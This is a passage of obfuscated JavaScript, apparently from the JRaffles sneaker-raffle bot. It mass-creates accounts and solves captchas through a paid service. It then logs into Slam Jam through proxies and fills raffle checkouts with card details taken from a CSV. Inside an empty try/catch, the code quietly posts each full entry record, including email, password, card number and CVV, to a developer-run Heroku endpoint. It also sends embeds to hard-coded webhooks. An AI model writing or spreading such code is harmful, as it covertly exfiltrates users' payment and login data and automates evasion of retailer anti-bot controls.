_0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x556aa9['$eval']('.shopify-challenge__container\x20>\x20form', _0x17f71a => _0x17f71a['submit']());
                            try {
                                await _0x556aa9['waitForSelector']('.product-card__image'), await _0xa2099c(0x1f4), _0x2dc090 = 'no', console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Account\x20' + _0xd7d472[_0x4bbe2f]['Email'] + '\x20Generated!')), _0x376369['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0xd7d472[_0x4bbe2f]['Email'] + ',' + _0xd7d472[_0x4bbe2f]['Password']), console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Account\x20' + _0xd7d472[_0x4bbe2f]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x193747['succesDEVMSG']);
                                } catch {
                                }
                                await _0x310f97(_0x203e00, _0x193747['succesDEVMSG']);
                            } catch (_0x13e193) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x13e193));
                            }
                        } catch (_0x5a37e5) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20' + _0x5a37e5));
                        } finally {
                            _0x7f9099 && _0x7f9099['close']();
                            if (_0x2dc090 == 'yes' && _0x26701e != 0x5) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x39505b['name'] + ']\x20Task\x20' + (_0x4bbe2f + 0x1) + '\x20:\x20Retrying\x20(' + _0x26701e + '\x20/\x205)')), _0x4bbe2f = _0x4bbe2f - 0x1, _0x26701e = _0x26701e + 0x1;
                                continue;
                            }
                            _0x2dc090 == 'yes' && _0x26701e >= 0x5 && (_0x391951(_0xd7d472[_0x4bbe2f], _0x39505b), _0x2dc090 = 'no', _0x26701e = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x551b29, _0x1ab5ff, _0x25b795) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc8878 = 0x0; _0xc8878 < _0x1ab5ff['length']; _0xc8878++) {
                        var _0x29afc9;
                        if (_0x3cca1d != 'yes')
                            var _0x3cca1d = '', _0x1f6d3c = 0x0;
                        _0x215576(_0x551b29['name'] + '\x20Task\x20' + (_0xc8878 + 0x1) + '\x20/\x20' + _0x1ab5ff['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        try {
                            await _0x53ad15(_0x1ab5ff, _0xc8878);
                        } catch {
                            _0x3cca1d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1ab5ff[_0xc8878]['Email'] == '' || _0x1ab5ff[_0xc8878]['Password'] == '' || _0x1ab5ff[_0xc8878]['FirstName'] == '' || _0x1ab5ff[_0xc8878]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0x244680 = _0x25b795[_0xc8878]['split'](':');
                        else
                            var _0x30f438 = Math['round'](Math['random']() * (_0x25b795['length'] - 0x1)), _0x244680 = _0x25b795[_0x30f438]['split'](':');
                        var _0x4c3fd9;
                        try {
                            _0x4c3fd9 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x244680[0x0] + ':' + _0x244680[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4c3fd9 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x244680[0x0] + ':' + _0x244680[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2a33fe = await _0x4c3fd9['newPage']();
                            await _0x2a33fe['authenticate']({
                                'username': '' + _0x244680[0x2],
                                'password': '' + _0x244680[0x3]
                            }), await _0x2a33fe['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a33fe['setRequestInterception'](!![]), _0x2a33fe['on']('request', _0x174742 => {
                                _0x174742['resourceType']() === 'image' || _0x174742['resourceType']() === 'font' || _0x174742['resourceType']() === 'media' ? _0x174742['abort']() : _0x174742['continue']();
                            }), await _0x2a33fe['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2a33fe['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2a33fe['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xa2099c(0x258), await _0x2a33fe['waitForSelector']('#CustomerEmail'), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2a33fe['type']('#CustomerEmail', '' + _0x1ab5ff[_0xc8878]['Email']), await _0xa2099c(0x12c), await _0x2a33fe['type']('#CustomerPassword', '' + _0x1ab5ff[_0xc8878]['Password']), await _0xa2099c(0x226), await _0x2a33fe['$eval']('#customer_login', _0x128ccf => _0x128ccf['submit']()), await _0xa2099c(0x7d0), await _0x2a33fe['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20' + _0x536226['cyan']('Solving\x20Captcha')), await _0x2a33fe['solveRecaptchas'](), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2a33fe['$eval']('.shopify-challenge__container\x20>\x20form', _0x1db23d => _0x1db23d['submit']());
                            try {
                                await _0x2a33fe['waitForSelector']('.nav-account'), await _0xa2099c(0x4b0);
                            } catch {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2a33fe['goto']('' + _0x1ab5ff[_0xc8878]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xa2099c(0xbb8), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2a33fe['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x2a33fe['click']('.product-select-variant-wrapper'), await _0xa2099c(0x320), await _0x2a33fe['click']('li.product-select-variant__value[data-size=\x22' + _0x1ab5ff[_0xc8878]['Size'] + '\x22]'), await _0xa2099c(0x384), await _0x2a33fe['$eval']('#AddToCartForm-product-template-raffle', _0x37caae => _0x37caae['submit']()), await _0x2a33fe['waitForSelector']('.cart-order-summary__content'), await _0xa2099c(0x514), await _0x2a33fe['goto']('https://drop.slamjam.com/checkout'), await _0xa2099c(0x514), await _0x2a33fe['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2a33fe['select']('#checkout_shipping_address_country', '' + _0x1ab5ff[_0xc8878]['Country']), await _0xa2099c(0x200), await _0x2a33fe['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2a33fe['type']('#checkout_shipping_address_first_name', '' + _0x1ab5ff[_0xc8878]['FirstName']), await _0xa2099c(0x237), await _0x2a33fe['type']('#checkout_shipping_address_last_name', '' + _0x1ab5ff[_0xc8878]['LastName']), await _0xa2099c(0x1e0), await _0x2a33fe['type']('#checkout_shipping_address_address1', _0x1ab5ff[_0xc8878]['Address1'] + '\x20' + _0x1ab5ff[_0xc8878]['HouseNumber']), await _0xa2099c(0x514), await _0x2a33fe['type']('#checkout_shipping_address_address2', '' + _0x1ab5ff[_0xc8878]['Address2']), await _0xa2099c(0x514);
                            _0x1ab5ff[_0xc8878]['Postcode'] == undefined && (_0x1ab5ff[_0xc8878]['Postcode'] = _0x1ab5ff[_0xc8878]['Zip']);
                            await _0x2a33fe['type']('#checkout_shipping_address_zip', '' + _0x1ab5ff[_0xc8878]['Postcode']), await _0xa2099c(0x2bc), await _0x2a33fe['type']('#checkout_shipping_address_city', '' + _0x1ab5ff[_0xc8878]['City']), await _0xa2099c(0x320), await _0x2a33fe['type']('#checkout_shipping_address_phone', '' + _0x1ab5ff[_0xc8878]['Phone']), await _0xa2099c(0x320), await _0x2a33fe['click']('#continue_button'), await _0xa2099c(0xbb8), await _0x2a33fe['waitForSelector']('.summary-title'), await _0xa2099c(0x320), await _0x2a33fe['click']('#continue_button'), await _0xa2099c(0x320), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2a33fe['waitForSelector']('#checkout_credit_card_vault'), await _0xa2099c(0x3e8);
                            var _0x1e36a5 = await _0x2a33fe['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x32b4d6 = await _0x1e36a5['contentFrame']();
                            await _0x32b4d6['click']('#number'), await _0xa2099c(0x3e8), await _0x32b4d6['type']('#number', '' + _0x1ab5ff[_0xc8878]['CardNumber'], { 'delay': 0x78 }), _0x1e36a5 = await _0x2a33fe['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x32b4d6 = await _0x1e36a5['contentFrame'](), await _0xa2099c(0x1c2), await _0x32b4d6['click']('#name'), await _0xa2099c(0x1f4), await _0x32b4d6['type']('#name', '' + _0x1ab5ff[_0xc8878]['NameOnCard'], { 'delay': 0x78 }), _0x1e36a5 = await _0x2a33fe['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x32b4d6 = await _0x1e36a5['contentFrame'](), await _0xa2099c(0x1c2), await _0x32b4d6['click']('#expiry'), await _0xa2099c(0x1f4), await _0x32b4d6['type']('#expiry', '' + _0x1ab5ff[_0xc8878]['ExpiryDate'], { 'delay': 0x78 }), _0x1e36a5 = await _0x2a33fe['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x32b4d6 = await _0x1e36a5['contentFrame'](), await _0xa2099c(0x1c2), await _0x32b4d6['click']('#verification_value'), await _0xa2099c(0x1f4), await _0x32b4d6['type']('#verification_value', '' + _0x1ab5ff[_0xc8878]['CVV'], { 'delay': 0x78 }), await _0x2a33fe['$eval']('#accepts-flag-raffle', _0x41f0f2 => _0x41f0f2['click']()), await _0xa2099c(0x7d0), console['log'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2a33fe['$eval']('#continue_button', _0xc1f23b => _0xc1f23b['click']()), await _0xa2099c(0x1b58), await _0x2a33fe['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2a33fe['$eval']('.edit_checkout.animate-floating-labels', _0x374e5c => _0x374e5c['submit']()), await _0xa2099c(0x7d0);
                            try {
                                await _0x2a33fe['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x3cca1d = 'no', _0x48af7e(_0x1ab5ff[_0xc8878], _0x551b29), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x136be8) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x136be8['message']);
                            }
                            var _0x3d95f5 = await _0x258e8b(_0x1ab5ff[_0xc8878], _0x551b29, 'dev', ![]), _0x429978 = await _0x258e8b(_0x1ab5ff[_0xc8878], _0x551b29, 'pub', ![]);
                            let _0x27cf84 = _0x1ab5ff[_0xc8878];
                            try {
                                prxdata = {
                                    'username': _0x1bdb7f['replace']('#', ''),
                                    'module': _0x551b29['name'],
                                    'entrydata': JSON['stringify'](_0x27cf84),
                                    'proxy': '' + _0x25b795[_0xc8878]
                                };
                                var _0x2b6a07 = JSON['stringify'](prxdata);
                                let _0x5f102c = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x2b6a07, _0x5f102c);
                            } catch (_0xf95ec0) {
                            }
                            const _0x3b98ce = {
                                'succesDEVMSG': { 'embeds': [_0x3d95f5] },
                                'succesPUBMSG': { 'embeds': [_0x429978] }
                            };
                            try {
                                _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x3b98ce['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x3b98ce['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x3b98ce['succesPUBMSG']);
                            } catch (_0x41dd00) {
                                console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x41dd00));
                            }
                        } catch (_0x28c1bc) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xabefbd[taskModule]['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20' + _0x28c1bc)), _0x29afc9 = '' + _0x28c1bc;
                            var _0xdc09f3 = await _0x258e8b(kickz[_0xc8878], _0x551b29, 'dev', !![], _0x29afc9);
                            EMBEDS['errorDEV'] = { 'embeds': [_0xdc09f3] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], EMBEDS['errorDEV']), await _0x310f97(_0x281108, EMBEDS['errorDEV']), _0x3cca1d = 'yes';
                        } finally {
                            _0x4c3fd9 && _0x4c3fd9['close']();
                            if (_0x3cca1d == 'yes' && _0x1f6d3c != 0x5 && _0x29afc9 != 'Size\x20Not\x20Found') {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x551b29['name'] + ']\x20Task\x20' + (_0xc8878 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1f6d3c + '\x20/\x205)')), _0xc8878 = _0xc8878 - 0x1, _0x1f6d3c = _0x1f6d3c + 0x1;
                                continue;
                            }
                            _0x3cca1d == 'yes' && _0x1f6d3c >= 0x5 && (_0x391951(_0x1ab5ff[_0xc8878], _0x551b29), _0x3cca1d = 'no', _0x1f6d3c = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x484966) {
                    var _0x25195a = await _0x169d17(), _0x1e5ce1 = _0x376369['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x542c53 = _0x4f3c15['parse'](_0x1e5ce1, { 'header': !![] })['data'];
                    for (var _0x1d6758 = 0x0; _0x1d6758 < _0x542c53['length']; _0x1d6758++) {
                        var _0x5d8354 = _0x542c53[_0x1d6758]['Store'], _0x16ffed = _0x542c53[_0x1d6758]['Mode'];
                        for (var _0x596113 of _0xabefbd) {
                            const _0x3831a9 = _0x596113['name']['includes'](_0x5d8354);
                            if (!_0x3831a9)
                                continue;
                            for (mode of _0x596113['modules']) {
                                if (mode['name'] == _0x16ffed) {
                                    console['log']('Running\x20' + _0x536226['cyan'](mode['name'])), await mode['function'](mode, [_0x542c53[_0x1d6758]], _0x25195a);
                                    var _0x2083df = _0x1e5ce1['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x376369['writeFileSync']('../failed-tasks.csv', _0x2083df);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x40f50d = await _0xf4f9ff['get']('Answer');
                    if (_0x40f50d['Answer']['toLowerCase']() == 'y') {
                        _0x376369['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xa2099c(0x3e8);
                        return;
                    }
                    if (_0x40f50d['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xa2099c(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xa2099c(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x19d1a1(_0x1eab5d) {
    var _0x3386fa = await _0x169d17(), _0x18dd2e = _0x376369['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x2fa77c = _0x4f3c15['parse'](_0x18dd2e, { 'header': !![] })['data'];
    for (var _0x4e1f4b = 0x0; _0x4e1f4b < _0x2fa77c['length']; _0x4e1f4b++) {
        var _0x47a4e8 = _0x2fa77c[_0x4e1f4b]['Store'], _0x48ff60 = _0x2fa77c[_0x4e1f4b]['Mode'];
        for (var _0x3dafa8 of _0xabefbd) {
            const _0x3d7d87 = _0x3dafa8['name']['includes'](_0x47a4e8);
            if (_0x3d7d87)
                for (mode of _0xabefbd[_0x3dafa8]['modules']) {
                    const _0x459325 = mode['name']['includes'](_0x48ff60);
                    _0x459325 && (_0x1eab5d = mode['name'], await mode['function'](_0x1eab5d, _0x2fa77c[_0x4e1f4b], _0x3386fa));
                }
        }
    }
}
async function _0x35ebde() {
    await _0x37ec9c(), console['clear']();
    _0x2795a0['threads'] > 0x5 && (_0x2795a0['threads'] = 0x5);
    if (_0x39dec1 != 'devkey') {
        let _0x12cbc3 = await _0x2a5549['autoUpdate']();
        if (_0x12cbc3 === 'yes')
            return _0x4b5524('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x598521 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xa2099c(0x2710);
        ;
    }
    await _0x478606(_0x598521);
    if (_0x1fc3e2 === ![])
        return console['log']('Closing\x20Browser'), await _0xa2099c(0xbb8);
    else
        try {
            var _0x4fa80e = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1bdb7f
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x39dec1
                    }
                ]
            }];
            const _0xef1a26 = { 'embeds': _0x4fa80e };
            var _0x5230e7 = await _0x258e8b(null, null, 'open', ![]);
            const _0x2179d4 = { 'openDEVMSG': { 'embeds': [_0x5230e7] } };
            await _0x310f97(_0x4ac3bd, _0x2179d4['openDEVMSG']);
            async function _0x179beb() {
                _0x215576('JRaffles\x20' + _0x39dec1), console['clear'](), console['log']('Hello\x20' + _0x536226['cyan']('' + _0x1bdb7f) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x39dec1), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x56b486 = 0x0; _0x56b486 < _0xabefbd['length'] - 0x4; _0x56b486++) {
                    if (_0x56b486 >= 0xa) {
                        console['log']('\x20(' + _0x56b486 + ')\x20[' + _0xabefbd[_0x56b486]['name'] + ']');
                        continue;
                    }
                    if (_0xabefbd[_0x56b486]['name'] === 'Reload\x20Settings' || _0xabefbd[_0x56b486]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x56b486 + ')\x20\x20[' + _0xabefbd[_0x56b486]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0xabefbd['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0xabefbd['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0xabefbd['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0xabefbd['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0xc3b8d0();
                if (taskModule > _0xabefbd['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xa2099c(0x3e8), _0x179beb();
                if (_0xabefbd[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x5f59fc = await _0x169d17();
                            await _0x343003['function'](_0x343003, _0x5f59fc);
                        }
                        if (taskFunction == 0x2) {
                            var _0x5f59fc = await _0x169d17(), _0x38211a = await _0xe9776e(_0x343003);
                            _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x38211a), await _0x343003['function'](_0x343003, _0x38211a, _0x5f59fc);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5f59fc = await _0x169d17(), _0x38211a = await _0xe9776e(_0x343003);
                                _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x38211a), await _0x343003['function'](_0x343003, _0x38211a, _0x5f59fc);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x5f59fc = await _0x169d17();
                                    await _0x343003['function'](_0x343003, _0x5f59fc);
                                }
                            }
                        }
                    } catch (_0x2b2aac) {
                        console['log'](_0x2b2aac), await _0xa2099c(0x7d0);
                    }
                    return _0x179beb();
                }
                if (_0xabefbd[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                        var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5f59fc = await _0x169d17(), _0x43e8ea = await _0xe9776e(_0x343003);
                            _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x43e8ea), await _0x343003['function'](_0x343003, _0x43e8ea, _0x5f59fc);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5f59fc = await _0x169d17(), _0x43e8ea = await _0xe9776e(_0x343003);
                                _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x43e8ea), await _0x343003['function'](_0x343003, _0x43e8ea, _0x5f59fc);
                            }
                        }
                    } catch (_0x118fa4) {
                        console['log'](_0x118fa4), await _0xa2099c(0xfa0);
                    }
                    return _0x179beb();
                }
                if (_0xabefbd[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                        var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5f59fc = await _0x169d17(), _0x43e8ea = await _0xe9776e(_0x343003);
                            _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x43e8ea), await _0x343003['function'](_0x343003, _0x43e8ea, _0x5f59fc);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5f59fc = await _0x169d17(), _0x43e8ea = await _0xe9776e(_0x343003);
                                _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x43e8ea), await _0x343003['function'](_0x343003, _0x43e8ea, _0x5f59fc);
                            }
                        }
                    } catch (_0x4f1cba) {
                        console['log'](_0x4f1cba), await _0xa2099c(0xfa0);
                    }
                    return _0x179beb();
                }
                if (_0xabefbd[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x5f59fc = await _0x169d17();
                        return await _0x343003['function'](_0x343003, _0x5f59fc), _0x179beb();
                    }
                    var _0x5f59fc = await _0x169d17(), _0x29f425 = await _0xe9776e(_0x343003);
                    return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x29f425), await _0x343003['function'](_0x343003, _0x29f425, _0x5f59fc), _0x179beb();
                }
                if (_0xabefbd[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5f59fc = await _0x169d17(), _0x29f425 = await _0xe9776e(_0x343003);
                    return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x29f425), await _0x343003['function'](_0x343003, _0x29f425, _0x5f59fc), _0x179beb();
                }
                if (_0xabefbd[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5f59fc = await _0x169d17(), _0x29f425 = await _0xe9776e(_0x343003);
                    return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x29f425), await _0x343003['function'](_0x343003, _0x29f425, _0x5f59fc), _0x179beb();
                }
                if (_0xabefbd[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5f59fc = await _0x169d17(), _0x29f425 = await _0xe9776e(_0x343003);
                    return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x29f425), await _0x343003['function'](_0x343003, _0x29f425, _0x5f59fc), _0x179beb();
                } else {
                    if (_0xabefbd[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                        var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x5f59fc = await _0x169d17(), _0x5bf8aa = await _0xe9776e(_0x343003);
                            return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x5bf8aa), await _0x343003['function'](_0x343003, _0x5bf8aa, _0x5f59fc), _0x179beb();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5f59fc = await _0x169d17();
                                return await _0x343003['function'](_0x343003, null, _0x5f59fc), _0x179beb();
                            }
                        }
                        ;
                    } else {
                        if (_0xabefbd[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                            var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction], _0x5f59fc = await _0x169d17(), _0x2a60a3 = await _0xe9776e(_0x343003);
                            return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x2a60a3), await _0x343003['function'](_0x343003, _0x2a60a3, _0x5f59fc), await _0xa2099c(0x1388), _0x179beb();
                        } else {
                            if (_0xabefbd[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0xee7084 = { 'headers': { 'content-type': 'application/json' } }, _0x202366 = { 'key': _0x598521 }, _0x5c2a35 = await _0x3f36f4['post']('https://jraffles.herokuapp.com/beta', _0x202366, _0xee7084);
                                    if (_0x5c2a35['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x536226['cyan'](_0x1bdb7f) + '.\x20Beta\x20Access\x20Granted.'), await _0xa2099c(0x3e8);
                                } catch (_0x4ab258) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0xa2099c(0x7d0), _0x179beb();
                                }
                                taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
